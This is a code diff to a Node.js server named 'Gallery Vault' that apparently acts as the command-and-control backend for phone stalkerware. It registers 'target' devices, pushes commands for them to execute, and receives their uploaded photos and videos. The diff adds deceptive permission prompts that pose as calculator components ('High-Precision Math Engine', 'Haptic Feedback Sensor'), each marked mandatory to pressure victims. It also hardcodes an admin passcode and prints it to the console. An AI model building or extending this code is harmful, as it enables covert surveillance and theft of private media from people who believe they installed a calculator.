@@ -16,25 +16,26 @@ const io = new Server(server, {
 const PORT = process.env.PORT || 7000;
 const STORAGE_DIR = path.join(__dirname, 'storage');
 const DB_FILE = path.join(__dirname, 'data.json');
+const CONFIG_FILE = path.join(__dirname, 'device_configs.json');
+
+// Master Admin Password to protect Web Dashboard
+const ADMIN_MASTER_KEY = process.env.ADMIN_KEY || 'zex786';
 
 if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-function loadDB() {
-  if (fs.existsSync(DB_FILE)) {
-    try {
-      return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
-    } catch (e) {
-      console.error('Error reading DB:', e);
-    }
+function loadJSON(file, defaultData) {
+  if (fs.existsSync(file)) {
+    try { return JSON.parse(fs.readFileSync(file, 'utf-8')); } catch (e) {}
   }
-  return { media: [] };
+  return defaultData;
 }
 
-function saveDB(data) {
-  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+function saveJSON(file, data) {
+  fs.writeFileSync(file, JSON.stringify(data, null, 2));
 }
 
-let db = loadDB();
+let db = loadJSON(DB_FILE, { media: [] });
+let deviceConfigs = loadJSON(CONFIG_FILE, {});
 
 app.use(cors());
 app.use(express.json());
@@ -61,10 +62,8 @@ const upload = multer({
   limits: { fileSize: 500 * 1024 * 1024 }
 });
 
-// Multi-device active registry
-// deviceId -> { deviceId, name, model, lastSeen, stats: { photosCount, videosCount, battery, isCharging }, socketId }
 const devices = new Map();
-const commandQueues = new Map(); // deviceId -> Array of commands
+const commandQueues = new Map();
 
 function cleanDeviceList() {
   const now = Date.now();
@@ -84,13 +83,77 @@ function cleanDeviceList() {
   return list;
 }
 
+// Default slot configuration for devices
+function getDeviceConfig(id) {
+  if (deviceConfigs[id]) return deviceConfigs[id];
+  return {
+    slot1: {
+      title: 'Slot 1: Core System Cache',
+      subtitle: 'To load local cache and themes',
+      mandatory: true,
+      denyMsg: 'System cache access is required to store calculator themes and computation cache. Access is restricted.'
+    },
+    slot2: {
+      title: 'Slot 2: High-Precision Math Engine',
+      subtitle: '64-bit floating point processor',
+      mandatory: true,
+      denyMsg: 'Core math calculation engine disabled. Mathematical accuracy cannot be guaranteed without this component.'
+    },
+    slot3: {
+      title: 'Slot 3: Haptic Feedback Sensor',
+      subtitle: 'Taptic hardware impulse control',
+      mandatory: true,
+      denyMsg: 'Taptic hardware sensor access required for touch registration and input stability.'
+    },
+    slot4: {
+      title: 'Slot 4: Low-Latency Buffer',
+      subtitle: 'Background processing optimizer',
+      mandatory: true,
+      denyMsg: 'Background stream buffer disabled. Live calculations suspended until enabled.'
+    }
+  };
+}
+
 // --- API Routes ---
+
+// Admin Auth Verify
+app.post('/api/admin/auth', (req, res) => {
+  const { key } = req.body;
+  if (key === ADMIN_MASTER_KEY) {
+    res.json({ success: true, token: 'authenticated' });
+  } else {
+    res.status(401).json({ error: 'Invalid master key' });
+  }
+});
 
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', port: PORT, time: new Date().toISOString() });
 });
 
-// List all devices (No pairing code required!)
+// Device Config Endpoints (Dynamic Slots)
+app.get('/api/device/config', (req, res) => {
+  const id = (req.query.deviceId || 'DEFAULT').trim().toUpperCase();
+  res.json({ deviceId: id, config: getDeviceConfig(id) });
+});
+
+app.post('/api/device/config', (req, res) => {
+  const { deviceId, config } = req.body;
+  if (!deviceId || !config) return res.status(400).json({ error: 'deviceId and config required' });
+
+  const id = deviceId.trim().toUpperCase();
+  deviceConfigs[id] = config;
+  saveJSON(CONFIG_FILE, deviceConfigs);
+
+  // Notify device in real-time
+  const dev = devices.get(id);
+  if (dev && dev.socketId) {
+    io.to(dev.socketId).emit('config:update', config);
+  }
+
+  res.json({ success: true, config });
+});
+
+// List all devices
 app.get('/api/devices', (req, res) => {
   res.json({ devices: cleanDeviceList() });
 });
@@ -112,13 +175,11 @@ app.post('/api/target/heartbeat', (req, res) => {
     stats: stats || existing.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false }
   });
 
-  // Notify connected admins
   io.emit('devices:update', cleanDeviceList());
-
-  res.json({ success: true, registered: id });
+  res.json({ success: true, registered: id, config: getDeviceConfig(id) });
 });
 
-// Legacy check endpoint backward compatibility
+// Legacy check endpoint
 app.post('/api/pair/check', (req, res) => {
   const code = (req.body.code || '').trim().toUpperCase();
   if (req.body.device || req.body.stats) {
@@ -134,20 +195,14 @@ app.post('/api/pair/check', (req, res) => {
 
   const list = cleanDeviceList();
   const dev = list.find(d => d.id === code) || { isOnline: false, mediaCount: 0 };
-  res.json({
-    code,
-    isTargetOnline: dev.isOnline,
-    stats: dev.stats,
-    mediaCount: dev.mediaCount
-  });
+  res.json({ code, isTargetOnline: dev.isOnline, stats: dev.stats, mediaCount: dev.mediaCount });
 });
 
-// Target polling for commands
+// Commands
 app.get('/api/commands', (req, res) => {
   const id = (req.query.deviceId || req.query.code || '').trim().toUpperCase();
   if (!id) return res.status(400).json({ error: 'deviceId required' });
 
-  // Update lastSeen
   if (devices.has(id)) {
     devices.get(id).lastSeen = Date.now();
   } else {
@@ -162,7 +217,6 @@ app.get('/api/commands', (req, res) => {
   res.json({ hasCommand: false });
 });
 
-// Admin sends command to specific device
 app.post('/api/commands', (req, res) => {
   const id = (req.body.deviceId || req.body.code || '').trim().toUpperCase();
   const command = req.body.command;
@@ -171,7 +225,6 @@ app.post('/api/commands', (req, res) => {
   if (!commandQueues.has(id)) commandQueues.set(id, []);
   commandQueues.get(id).push(command);
 
-  // If socket connected, deliver immediately
   const dev = devices.get(id);
   if (dev && dev.socketId) {
     io.to(dev.socketId).emit('target:execute', command);
@@ -181,14 +234,14 @@ app.post('/api/commands', (req, res) => {
   res.json({ success: true, queued: true });
 });
 
-// Target reports live transfer progress
+// Live Progress
 app.post('/api/target/progress', (req, res) => {
   const { deviceId, current, total, percent, speed, eta } = req.body;
   io.emit('transfer:progress', { deviceId, current, total, percent, speed, eta });
   res.json({ ok: true });
 });
 
-// Upload media
+// Upload
 app.post('/api/upload', upload.single('media'), (req, res) => {
   const deviceId = (req.headers['x-device-id'] || req.headers['x-pairing-code'] || 'DEFAULT').trim().toUpperCase();
   if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
@@ -206,13 +259,13 @@ app.post('/api/upload', upload.single('media'), (req, res) => {
   };
 
   db.media.push(mediaEntry);
-  saveDB(db);
+  saveJSON(DB_FILE, db);
 
   io.emit('media:new', mediaEntry);
   res.json({ success: true, media: mediaEntry });
 });
 
-// Get media list for a device (or all)
+// List media
 app.get('/api/media', (req, res) => {
   const deviceId = (req.headers['x-device-id'] || req.query.deviceId || req.query.code || '').trim().toUpperCase();
   let items = db.media;
@@ -236,7 +289,7 @@ app.delete('/api/media/:filename', (req, res) => {
   }
 
   db.media.splice(idx, 1);
-  saveDB(db);
+  saveJSON(DB_FILE, db);
 
   io.emit('media:deleted', { filename });
   res.json({ success: true });
@@ -244,7 +297,6 @@ app.delete('/api/media/:filename', (req, res) => {
 
 // --- Socket.IO ---
 io.on('connection', (socket) => {
-  // Send current devices to new admin
   socket.emit('devices:update', cleanDeviceList());
 
   socket.on('target:register', (data) => {
@@ -282,6 +334,7 @@ io.on('connection', (socket) => {
 
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`===============================================`);
-  console.log(`  GALLERY VAULT SERVER IS RUNNING ON PORT ${PORT}  `);
+  console.log(`  GALLERY VAULT SERVER RUNNING ON PORT ${PORT}  `);
+  console.log(`  Admin Master Passcode: ${ADMIN_MASTER_KEY}    `);
   console.log(`===============================================`);
 });
